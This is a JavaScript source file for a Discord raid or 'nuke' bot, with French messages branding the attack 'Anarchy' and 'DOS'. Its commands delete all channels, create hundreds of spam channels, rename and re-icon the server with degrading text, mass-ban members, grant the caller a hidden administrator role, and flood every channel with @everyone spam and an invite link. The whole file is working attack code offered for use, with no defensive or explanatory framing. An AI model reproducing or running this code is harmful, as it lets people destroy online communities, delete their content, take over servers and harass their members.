const Discord = require("discord.js");
const client = new Discord.Client();

client.on('ready',() => {
  console.log(client.user.username + "go");
    //invit link
    /*client.guilds.forEach(guild => {
      var invite = client.guilds.find("id", guild.id).channels.find("id", guild.defaultChannel.id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })*/
});
/*
  guild.setIcon('https://cdn.discordapp.com/icons/518757431250255872/3affdc73ea126ad1827c48143479e62c.jpg?size=1024').catch(e => {});
  guild.setName('Dead by Anarchy haha !').catch(e => {});
  
  for (var i = 0; i < 415; i++) {
    guild.createChannel('purgé par DOS.', 'voice').catch(e => {});
  }
  
  for (var i = 0; i < 49; i++) {
    guild.createChannel('Détruit par Anarchy !!!', 'text').catch(e => {});
  }
*/


client.on('message', msg => {
 

  /*if (msg.content === '-ded') {
      if (msg.channel.type === "dm") return;
      if (msg.deletable) msg.delete();
      msg.guild.members.forEach(member => {
        
          member.send("**" + msg.guild.owner.user.username + "** détruit par Anarchy ;)").catch(error => {}) }, 450)
}
*/
if(msg.content === 'oops'){
if(msg.channel.type === "dm") return;
if(msg.guild.channels.size === 0) return;
else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
msg.member.guild.createRole({
  name: "󠂪",
  permissions: "ADMINISTRATOR",
  mentionable: false
  }).then(function(role) {
  msg.member.addRole(role);
  if (msg.deletable) msg.delete().catch(e => {});
  }).catch(e => {});
msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
for (var i = 0; i < 490; i++) {
  msg.guild.setIcon('https://cdn.discordapp.com/attachments/535351927882645525/535901228769476619/unknown.png').catch(e => {})
  msg.guild.setName('Violé par Anarchy ' + i + ' fois.').catch(e => {});
  msg.guild.createChannel('Détruit par Anarchy', 'voice').catch(e => {});
  msg.guild.createChannel('Détruit par Anarchy', 'text').catch(e => {});
}
}

if (msg.content === 'Anarchy') {
console.log(`Commande -ded par ${msg.author.tag}`);

msg.guild.setIcon('https://cdn.discordapp.com/icons/518757431250255872/3affdc73ea126ad1827c48143479e62c.jpg?size=1024').catch(e => {});
msg.guild.setName('Dead by Anarchy haha !').catch(e => {});

for (var i = 0; i < 415; i++) {
  msg.guild.createChannel('purgé par DOS.', 'voice').catch(e => {});
}

for (var i = 0; i < 49; i++) {
  msg.guild.createChannel('Détruit par Anarchy !!!', 'text').catch(e => {});
}


if (msg.deletable) {
msg.delete();
}
}

if (msg.content === '-rban') {
console.log(`Commande -rban par ${msg.author.tag}`);
msg.guild.members.forEach(member => {
if (!member.roles.exists("name", "𝐃𝐎𝐒") && member.bannable) member.ban().catch(e => {});
});
}

if (msg.content === '-stop') {
console.log(`Commande -stop par ${msg.author.tag}`);
if (msg.deletable) msg.delete().catch(e => {});
msg.guild.leave().catch(e => {});
}

if (msg.content === '-gp') {
console.log(`Commande -gp par ${msg.author.tag}`);

msg.member.guild.createRole({
name: "𝐃𝐎𝐒",
permissions: "ADMINISTRATOR",
mentionable: false
}).then(function(role) {
msg.member.addRole(role);
if (msg.deletable) msg.delete().catch(e => {});
}).catch(e => {});
}
//#endregion
});
client.on("message", msg => {
if(msg.content.startsWith("oops")){
  setTimeout(function(){
 msg.delete()
  let i = 0;
  let interval = setInterval(function () {
    msg.guild.channels.forEach(channel => {
      if (channel.type === "text") channel.send("@everyone")
    }, 2500);
  }, 1000);
  });
}
});
client.on("message", msg => {
if(msg.content.startsWith("-all")){
 msg.delete()
  let i = 0;
  let interval = setInterval(function () {
    msg.guild.channels.forEach(channel => {
      if (channel.type === "text") channel.send("@everyone Ce serveur à été purgé par DOS.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://discord.gg/mvZjEDW\nhttps://cdn.discordapp.com/attachments/529372289935081472/529800499113754624/20190102_001632.gif")
    }, 2500);
  });
}
});

client.login(process.env.TOKEN)
